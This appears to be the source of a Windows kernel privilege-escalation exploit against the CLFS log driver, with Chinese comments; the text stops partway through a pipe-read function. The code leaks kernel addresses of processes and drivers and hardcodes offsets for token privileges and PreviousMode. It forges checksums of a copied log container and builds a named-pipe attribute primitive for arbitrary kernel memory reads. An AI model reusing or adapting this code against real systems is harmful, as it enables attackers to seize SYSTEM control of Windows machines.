
#include <windows.h>
#include <iostream>
//#include "blf.h"
#include <ntstatus.h>
#include "debug.h"

#include <clfsw32.h>

#pragma comment(lib, "Clfsw32.lib")

#include <comdef.h>

//进程用户检测


#define MAX_NAME 256


BOOL GetLogonFromToken(HANDLE hToken)
{
	DWORD dwSize = MAX_NAME;
	BOOL bSuccess = FALSE;
	DWORD dwLength = 0;

	TOKEN_USER ptu[10] = { 0 };

	//Verify the parameter passed in is not NULL.
	if (NULL == hToken)
		return bSuccess;

	if (!GetTokenInformation(
		hToken,         // handle to the access token
		TokenUser,    // get information about the token's groups 
		(LPVOID)ptu,   // pointer to PTOKEN_USER buffer
		sizeof(ptu),       // size of buffer
		&dwLength       // receives required buffer size
	))
	{
		return bSuccess;
	}
	SID_NAME_USE SidType;
	WCHAR lpName[MAX_NAME];
	WCHAR lpDomain[MAX_NAME];

	if (!LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType))
	{
		DWORD dwResult = GetLastError();
		if (dwResult == ERROR_NONE_MAPPED)
			wcscpy_s(lpName, L"NONE_MAPPED");
		else
		{
			printf("LookupAccountSid Error %un", GetLastError());
		}
	}
	else
	{
		wprintf(L"Current user is  %s\\%s",
			lpDomain, lpName);

		if (!wcscmp(lpName, L"SYSTEM"))
			bSuccess = TRUE;
	}

	return bSuccess;
}

int GetUserFromProcess(const DWORD procId)
{
	HANDLE hProcess = GetCurrentProcess();
	if (hProcess == NULL)
		return 0;
	HANDLE hToken = NULL;

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
	{
		CloseHandle(hProcess);
		return 0;
	}
	BOOL bres = GetLogonFromToken(hToken);

	CloseHandle(hToken);
	CloseHandle(hProcess);
	return bres ? 1 : 0;
}



//****************************************************
//crc32

#define CRC32_InitalValue  	0xFFFFFFFF
#define CRC32_Polynomial	0x04C11DB7 // Can not be changed
#define CRC32_XOROUT		0xFFFFFFFF


const uint32_t CRC32_table[] =
{
	0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA,
	0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
	0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
	0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
	0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,
	0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
	0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
	0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
	0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,
	0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
	0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940,
	0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
	0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
	0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
	0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
	0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
	0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A,
	0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
	0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,
	0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
	0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
	0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
	0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C,
	0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
	0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,
	0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
	0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,
	0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
	0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086,
	0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
	0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,
	0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
	0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,
	0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
	0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
	0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
	0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE,
	0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
	0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,
	0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
	0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252,
	0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
	0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60,
	0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
	0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,
	0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
	0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04,
	0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
	0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
	0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
	0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,
	0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
	0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E,
	0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
	0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,
	0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
	0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,
	0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
	0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0,
	0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
	0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6,
	0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
	0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
	0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
};

uint32_t crc_compute_crc32_ext(uint32_t init_value, uint8_t* buf, uint32_t buf_len)
{



	*((DWORD*)(buf + 0xC)) = 0;   //需要将校验和置为0在计算

	uint32_t CRC32_data = init_value;

	for (uint32_t i = 0; i < buf_len; i++)
	{
		uint32_t t = (CRC32_data ^ buf[i]) & 0xFF;

		CRC32_data = ((CRC32_data >> 8) & 0xFFFFFF) ^ CRC32_table[t];
	}
	return CRC32_data ^ CRC32_XOROUT;
}




//****************************************************
//API

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


//API相关数据结构
#define MAXIMUM_FILENAME_LENGTH 255 
typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;


typedef enum _SYSTEM_INFORMATION_CLASS {

	SystemExtendedHandleInformation = 64,
	SystemModuleInformation = 0xb,
	SystemHandleInformation = 0x10,
	SystemBigPoolInformation = 0x42
} SYSTEM_INFORMATION_CLASS;



typedef struct _SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;


typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;


//api
typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);



//
// 版本相关的偏移量
//
#define OFFSET_OF_PREVIOUS_MODE 0x232
#define OFFSET_OF_WIN32PROCESS 0x3b0
#define OFFSET_OF_SEP_TOKEN_PRIVILEGES 0x40
#define OFFSET_OF_DCOMPOSITIONPROCESS 0x100



//大池对象信息
typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;


// handle information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

_NtQuerySystemInformation fnNtQuerySystemInformation = NULL;

// 根据句柄获取的内核对象地址
SIZE_T GetObjectKernelAddress(HANDLE Object)
{
	PSYSTEM_HANDLE_INFORMATION_EX  handleInfo = NULL;
	ULONG	handleInfoSize = 0x1000;
	ULONG	retLength;
	NTSTATUS status;
	SIZE_T kernelAddress = 0;
	BOOL bFind = FALSE;

	while (TRUE)
	{
		// 申请内存
		handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

		//查询SystemExtendedHandleInformation信息
		status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);


		// 判断信息查询成功
		if (status == 0xC0000004 || NT_SUCCESS(status)) // STATUS_INFO_LENGTH_MISMATCH
		{
			// 释放原有内存
			LocalFree(handleInfo);

			//重新申请内存
			handleInfoSize = retLength + 0x100;
			handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);

			//查询
			status = fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);

			//查询成功
			if (NT_SUCCESS(status))
			{
				//遍历句柄
				for (ULONG i = 0; i < handleInfo->HandleCount; i++)
				{
					//system进程
					if ((USHORT)Object == 0x4)
					{
						//判断进程ID和句柄值
						if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{

							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;  //对象地址
							bFind = TRUE; //成功标识
							break;
						}
					}
					//其他进程
					else
					{
						//判断进程ID和句柄值
						if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)Object == (SIZE_T)handleInfo->Handles[i].HandleValue)
						{
							kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;  //对象地址
							bFind = TRUE; //成功标识
							break;
						}
					}
				}
			}

		}

		// 释放内存
		if (handleInfo)
			LocalFree(handleInfo);

		// 查询到了指定的数据，退出循环
		if (bFind)
			break;
	}

	return kernelAddress;
}



//初始化
int InitApi()
{

	// 获取NtQuerySystemInformation地址
	fnNtQuerySystemInformation 
		= (_NtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
	if (fnNtQuerySystemInformation)
	{
		PLOG("[+] Get NtQuerySystemInformation address success.\n");
		return 1;
	}
	else
	{
		PLOG("[-] Get NtQuerySystemInformation address failed.\n");
		return 0;
	}

}



UINT64 FileObject = 0;
int GetFileObject()
{


	DWORD pId=GetCurrentProcessId();



	int result = 0;
	DWORD dwBytesReturned = 0;
	LPVOID lpHeapBuffer = 0;
	HANDLE hHeap = 0;
	NTSTATUS status = 0;
	PSYSTEM_HANDLE_INFORMATION psm = 0;
	int i = 0;


	CopyFile(L".\\.container_1", L".\\.container_2", false);
	HANDLE ha = CreateFileW(L".\\.container_2", 0xC0000000, 7u, 0, 3u, 0x80u, 0);
	if (ha == INVALID_HANDLE_VALUE)
	{
		PLOG("[-](GetFileObject) CreateFileW fail\n");
	}

	//获取堆句柄，堆句柄不能用CloseHandle关闭
	hHeap = GetProcessHeap();
	if (!hHeap)
	{
		PLOG("[-] Get process heap fail\n");
		goto fail;
	}

	lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);  //分配内存
	if (!lpHeapBuffer) {
		PLOG("[-] Heap alloc fail\n");
		goto fail;
	}

	
	//查询模块信息
	status = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, lpHeapBuffer,
		0x2000, &dwBytesReturned);


	//查询失败
	if (!NT_SUCCESS(status)) {
		PLOG("[-] First NtQuerySystemInformation SystemHandleInformation failed\n");

		

		//释放内存
		HeapFree(hHeap, 0, lpHeapBuffer);
		//重新申请
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);
		if (!lpHeapBuffer) {
			PLOG("[-] Heap alloc fail\n");
			goto fail;
		}

		memset(lpHeapBuffer, 0, dwBytesReturned);

		//再次查询
		status = fnNtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);
	
		//依旧查询失败
		if (!NT_SUCCESS(status)) {
			PLOG("[-] NtQuerySystemInformation SystemHandleInformation failed  \n");

			goto fail;
		}
	}

	//查询成功
	psm = (PSYSTEM_HANDLE_INFORMATION)lpHeapBuffer;



	//遍历模块，查询CLFS基址
	printf("\nNumberOfHandles：%d\n", psm->NumberOfHandles);
	for (i = 0; i < psm->NumberOfHandles; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)psm->Handles[i];
	
		if (handleInfo.UniqueProcessId == pId && handleInfo.HandleValue == (USHORT)ha)
		{
			FileObject = (UINT64)handleInfo.Object;

		}
	}

	//PLOG("[+] Module name --> %s\n", psm->Modules[i].Name);
	printf("FileObject %x", FileObject);
	
	result = 1;

fail:
	if (lpHeapBuffer)
		HeapFree(hHeap, 0, lpHeapBuffer);

	return result;





}




//获取nt和clfs模块基址
int getNtAndClfsKernelModulesBase(PCHAR* pNtos, PCHAR* pClfs)
{
	int result = 0;
	DWORD dwBytesReturned = 0;
	LPVOID lpHeapBuffer = 0;
	HANDLE hHeap = 0;
	NTSTATUS status = 0;
	PSYSTEM_MODULE_INFORMATION psm = 0;
	int i = 0;
	CHAR clfs_path[] = { "\\SystemRoot\\System32\\drivers\\CLFS.SYS" };



	//获取堆句柄，堆句柄不能用CloseHandle关闭
	hHeap = GetProcessHeap();
	if (!hHeap)
	{
		PLOG("[-] Get process heap fail\n");
		goto fail;
	}

	lpHeapBuffer = HeapAlloc(hHeap, 0, 0x2000);  //分配内存
	if (!lpHeapBuffer) {
		PLOG("[-] Heap alloc fail\n");
		goto fail;
	}


	//查询模块信息
	status = fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, lpHeapBuffer,
		0x2000, &dwBytesReturned);


	//查询失败
	if (!NT_SUCCESS(status)) {
		//PLOG("[-] NtQuerySystemInformation SystemModuleInformation failed\n");

		//释放内存
		HeapFree(hHeap, 0, lpHeapBuffer);
		//重新申请
		lpHeapBuffer = HeapAlloc(hHeap, 0, dwBytesReturned);
		if (!lpHeapBuffer) {
			PLOG("[-] Heap alloc fail\n");
			goto fail;
		}

		memset(lpHeapBuffer, 0, dwBytesReturned);

		//再次查询
		status = fnNtQuerySystemInformation(
			(SYSTEM_INFORMATION_CLASS)SystemModuleInformation,
			lpHeapBuffer,
			dwBytesReturned,
			&dwBytesReturned
		);

		//依旧查询失败
		if (!NT_SUCCESS(status)) {
			PLOG("[-] NtQuerySystemInformation SystemModuleInformation failed  \n");
			goto fail;
		}
	}

	//查询成功
	psm = (PSYSTEM_MODULE_INFORMATION)lpHeapBuffer;

	*pNtos = 0;
	//模块数量大于0
	if (psm->ModulesCount > 0) {
		//获取ntos模块的内核基址，该模块位于数组中的第一个
		*pNtos = (PCHAR)psm->Modules[0].ImageBaseAddress;
	}

	*pClfs = 0;
	//遍历模块，查询CLFS基址
	for (i = 0; i < psm->ModulesCount; i++)
	{
		if (!strncmp(clfs_path, (CHAR*)psm->Modules[i].Name, strlen(clfs_path)))
		{
			*pClfs = (PCHAR)psm->Modules[i].ImageBaseAddress;
			break;
		}
	}
	//PLOG("[+] Module name --> %s\n", psm->Modules[i].Name);

	//获取失败
	if (!(*pClfs) || !(*pClfs))
		goto fail;

	result = 1;

fail:
	if (lpHeapBuffer)
		HeapFree(hHeap, 0, lpHeapBuffer);

	return result;

}

UINT64 G_ClfsEarlierLsn = 0;  //CLFS的ClfsEarlierLsn函数地址
UINT64 G_SeSetAccessStateGenericMapping = 0;  //ntos的SeSetAccessStateGenericMapping的函数地址
UINT64 G_ClfsMgmtDeregisterManagedClient = 0; //CLFS的ClfsMgmtDeregisterManagedClient函数地址
UINT64 G_PoFxProcessorNotification = 0; //ntos的PoFxProcessorNotification的函数地址



int InitKernelModulesFuncBase()
{
	int result = 0;
	PCHAR ntos_kernelBase = 0;
	PCHAR clfs_kernelBase = 0;
	HMODULE hc = 0, hn = 0;
	PCHAR SeSetAccessStateGenericMapping = 0, ClfsEarlierLsn = 0,
		ClfsMgmtDeregisterManagedClient = 0, PoFxProcessorNotification = 0;

	


	//查询NTOSKRNL和CLFS模块的内核基址
	if (getNtAndClfsKernelModulesBase(&ntos_kernelBase, &clfs_kernelBase))
	{
		PLOG("[+] Get CLFS/NTOS module kernel base address success \n");
	}
	else
	{
		PLOG("[-] Get CLFS/NTOS module kernel base address fail \n");
		goto fail;
	}


	//获取CLFS模块地址
	hc = LoadLibraryExW(L"C:\\Windows\\System32\\drivers\\CLFS.SYS", 0, 1);
	if (hc)
	{
		PLOG("[+] Get CLFS module handle success \n");
	}
	else
	{
		PLOG("[-] Get CLFS module handle fail \n");
		goto fail;
	}

	// 获取NTOSKRNL模块的地址
	hn = LoadLibraryExW(L"ntoskrnl.exe", 0, 1);
	if (hn)
	{
		PLOG("[+] Get CLFS module handle success \n");
	}
	else
	{
		PLOG("[-] Get CLFS module handle fail \n");
		goto fail;
	}


	//查询ClfsEarlierLsn函数地址
	ClfsEarlierLsn = (PCHAR)GetProcAddress(hc, "ClfsEarlierLsn");
	if (ClfsEarlierLsn)
	{
		PLOG("[+] Get ClfsEarlierLsn function success \n");
	}
	else
	{
		PLOG("[-] Get ClfsEarlierLsn function fail \n");
		goto fail;
	}


	//查询ClfsMgmtDeregisterManagedClient函数地址
	ClfsMgmtDeregisterManagedClient = (PCHAR)GetProcAddress(hc, "ClfsMgmtDeregisterManagedClient");
	if (ClfsMgmtDeregisterManagedClient)
	{
		PLOG("[+] Get ClfsMgmtDeregisterManagedClient function success \n");
	}
	else
	{
		PLOG("[-] Get ClfsMgmtDeregisterManagedClient function fail \n");
		goto fail;
	}


	// 查询SeSetAccessStateGenericMapping函数地址
	SeSetAccessStateGenericMapping = (PCHAR)GetProcAddress(hn, "SeSetAccessStateGenericMapping");
	if (SeSetAccessStateGenericMapping)
	{
		PLOG("[+] Get SeSetAccessStateGenericMapping function success \n");
	}
	else
	{
		PLOG("[-] Get SeSetAccessStateGenericMapping function fail \n");
		goto fail;
	}

	// 查询PoFxProcessorNotification函数地址
	PoFxProcessorNotification = (PCHAR)GetProcAddress(hn, "PoFxProcessorNotification");
	if (PoFxProcessorNotification)
	{
		PLOG("[+] Get PoFxProcessorNotification function success \n");
	}
	else
	{
		PLOG("[-] Get PoFxProcessorNotification function fail \n");
		goto fail;
	}


	//计算SeSetAccessStateGenericMapping内核地址
	G_SeSetAccessStateGenericMapping = ((UINT64)SeSetAccessStateGenericMapping) - ((UINT64)hn) + ((UINT64)ntos_kernelBase);


	//计算PoFxProcessorNotification内核地址
	G_PoFxProcessorNotification = ((UINT64)PoFxProcessorNotification) - ((UINT64)hn) + ((UINT64)ntos_kernelBase);


	//计算ClfsEarlierLsn内核地址
	G_ClfsEarlierLsn = (UINT64)ClfsEarlierLsn - (UINT64)hc + (UINT64)clfs_kernelBase;

	//计算ClfsMgmtDeregisterManagedClient内核地址
	G_ClfsMgmtDeregisterManagedClient = (UINT64)ClfsMgmtDeregisterManagedClient - (UINT64)hc + (UINT64)clfs_kernelBase;


	PLOG("[+] ClfsEarlierLsn kernel address -> %p\n", G_ClfsEarlierLsn);
	PLOG("[+] SeSetAccessStateGenericMapping kernel address -> %p\n", G_SeSetAccessStateGenericMapping);
	PLOG("[+] ClfsMgmtDeregisterManagedClient kernel address -> %p\n", G_ClfsMgmtDeregisterManagedClient);
	PLOG("[+] PoFxProcessorNotification kernel address -> %p\n", G_PoFxProcessorNotification);



	result = 1;
fail:

	return result;
}



int GetEPROCESSInformation(PDWORD64 pCurentProcessAddress, PDWORD64 pSystemProcessAddress)
{
	HANDLE hProcess = NULL;  //当前进程句柄
	int result = 0;
	// 获取当前进程句柄
	if (DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(),
		GetCurrentProcess(), &hProcess, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		PLOG("[+] Get curretn process handle success\n");
	}
	else
	{
		PLOG("[-] Get curretn process handle fail\n");
		goto fail;
	}

	// 获取当前进程的内核地址
	*pCurentProcessAddress = 0;
	*pCurentProcessAddress = GetObjectKernelAddress(hProcess);
	if (*pCurentProcessAddress)
	{
		PLOG("[+] Get curretn process address success-> %p\n", (PVOID)*pCurentProcessAddress);
	}
	else
	{
		PLOG("[-] Get curretn process address fail\n");
		goto fail;
	}


	// 获取system进程的内核地址
	*pSystemProcessAddress = 0;
	*pSystemProcessAddress = GetObjectKernelAddress((HANDLE)4);
	if (*pSystemProcessAddress)
	{
		PLOG("[+] Get system process address success -> %p\n", (PVOID)*pSystemProcessAddress);
	}
	else
	{
		PLOG("[-] Get system process address fail\n");
		goto fail;
	}


	result = 1;

fail:

	return result;

}





//****************************************************
//管道相关操作

typedef struct _IO_STATUS_BLOCK {
#pragma warning(push)
#pragma warning(disable: 4201) // we'll always use the Microsoft compiler
	union {
		NTSTATUS Status;
		PVOID Pointer;
	} DUMMYUNIONNAME;
#pragma warning(pop)

	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;


typedef VOID(NTAPI* PIO_APC_ROUTINE) (IN PVOID ApcContext,	IN PIO_STATUS_BLOCK IoStatusBlock,IN ULONG Reserved);



#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS func(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);

func* _NtFsControlFile;


UINT64* attribute = 0;
DWORD* hReadPipe[2] = { 0 };



int GetPipeArbitraryPtr(PDWORD64 pPipeArbitrary) {

	int result = 0;
	UINT64* outBuf = 0;
	ULONG retlen = 0;
	ULONG bufSize = 0;
	DWORD* bigPoolInformationBuf = 0;
	UINT64 offset_SeSetAccess = 0;
	UINT64 offset_ClfsEarlier = 0;
	IO_STATUS_BLOCK ioStatusBlock;

	attribute = 0;

	//管道属性标记
	UINT PIPE_ATTR_TAG = 0x7441704E; //NpAt	

	//获取NtFsControlFile地址
	HMODULE nt = GetModuleHandleA("ntdll");
	if (!nt)
	{
		PLOG("[-] Get ntdll module handle fail\n");
		goto fail;
	}
	_NtFsControlFile = (func*)GetProcAddress(nt, "NtFsControlFile");
	if (!_NtFsControlFile) exit(1);

	PLOG("[+] NtFsControlFile Address --> %p\n", _NtFsControlFile);


	//创建管道   管道读取句柄,管道写句柄,安全描述符,管道缓冲区的大小
	if (CreatePipe((PHANDLE)&hReadPipe[1], (PHANDLE)&hReadPipe[0], 0, 0x1000))
	{
		//PLOG("[+] hReadPipe --> %x\n[+] hWritePipe --> %x\n", hReadPipe[1], hReadPipe[0]);

		//申请管道属性
		attribute = (UINT64*)_malloc_base(0x2000);
		if (!attribute)
		{
			PLOG("[-] Allocate pipe attribute memory fail\n");
			goto fail;
		}
		memset((UINT64*)attribute + 1, 0x41, 0xffe); //管道属性值
		*(UINT64*)attribute = 0x5a; //管道属性名
		//NtFsControlFile会解析这个缓冲区，第一个0结尾的字符串赋值到AttributeName
		//后面的数据指针赋值给AttributeValue 

		outBuf = (UINT64*)malloc(0x100);
		if (!outBuf)
		{
			PLOG("[-] Allocate NtFsControlFile out buffer fail\n");
			goto fail;
		}
		memset(outBuf, 0x42, 0xff);


		//为写句柄创建管道属性（0x11003c）    
		_NtFsControlFile(hReadPipe[0],   //文件句柄
			0,  //事件句柄
			0,  //APC例程
			0,  //上下文区域
			&ioStatusBlock, // IO_STATUS_BLOCK，接收最终完成状态和有关操作的信息
			0x11003c,  //控制码，这里为创建管道属性
			attribute, //输入缓冲区的指针，即管道属性的DATA段
			0xfd8, //输入缓冲区的大小  AttributeValueSize为这个值
			outBuf,  //输出缓冲区的指针
			0x100);//输出缓冲区的大小

		//申请内存
		bufSize = 0x1000;
		bigPoolInformationBuf = (DWORD*)VirtualAlloc(0, bufSize, 0x1000, 4);
		if (!bigPoolInformationBuf)
		{
			PLOG("[-] Allocate big pool information buffer fail\n");
			goto fail;
		}

		//查询大池对象信息
		fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolInformationBuf, 0x1000, &retlen);

		//释放内存
		VirtualFree(bigPoolInformationBuf, bufSize, 0x1000);

		bufSize = retlen;
		//申请内存
		bigPoolInformationBuf = (DWORD*)VirtualAlloc(0, (SIZE_T)bufSize, 0x1000, 4);
		if (!bigPoolInformationBuf)
		{
			PLOG("[-] Second allocate big pool information buffer fail\n");
			goto fail;
		}

		//	fnNtQuerySystemInformation(SystemBigPoolInformation, v5a, retlen2, &retlen2);


		// find Attribute Tag inside the Pool
		//再次查询
		NTSTATUS status = STATUS_SUCCESS;
		if (NT_SUCCESS(status = fnNtQuerySystemInformation(SystemBigPoolInformation, bigPoolInformationBuf, retlen, &retlen))) {

			//大池信息结构
			PSYSTEM_BIGPOOL_INFORMATION pBuf = (PSYSTEM_BIGPOOL_INFORMATION)(bigPoolInformationBuf);

			//遍历SYSTEM_BIGPOOL_ENTRY数组
			for (ULONG i = 0; i < pBuf->Count; i++) {
				__try {
					if (pBuf->AllocatedInfo[i].TagUlong == PIPE_ATTR_TAG) {  //定位到管道的标记
						PLOG("[+] VirtualAddress -->%p\n[+] Tag --> %s\n", pBuf->AllocatedInfo[i].VirtualAddress, &pBuf->AllocatedInfo[i].TagUlong);

						//获取指向AttributeValueSiz的指针
						//pBuf->AllocatedInfo[i].VirtualAddress指向PipeAttribute
						//+24指向PipeAttribute结构中的AttributeValueSize 
						//*pPipeArbitrary = (DWORD64) ((CHAR*)(pBuf->AllocatedInfo[i].VirtualAddress)+24);  

						//AttributeValue的地址
						*pPipeArbitrary = (DWORD64)pBuf->AllocatedInfo[i].VirtualAddress;

						break;
					}
				}
				__except (EXCEPTION_EXECUTE_HANDLER) {
					PLOG("(%s) Access Violation was raised.", __FUNCTION__);
				}
			}
		}
		else
		{
			PLOG("[-] Query pipe fail \n");
			goto fail;
		}

	}
	else
	{
		PLOG("[-] Create pipe fail\n");
		return 0;
	}


	result = 1;

fail:

	if (attribute && !result)  //失败并且attribute有值释放，因为管道属性会一直使用
	{
		free(attribute);
	}

	if (outBuf)
	{
		free(outBuf);
	}

	if (bigPoolInformationBuf)
	{
		VirtualFree(bigPoolInformationBuf, bufSize, 0x1000);
	}


	return result;

}


//读取管道属性值
int ReadPipeArbitraryValue(PVOID outBuf, ULONG bufSize)
{
	IO_STATUS_BLOCK ioStatusBlock;
	int inBuf = 90;
	NTSTATUS status;
	
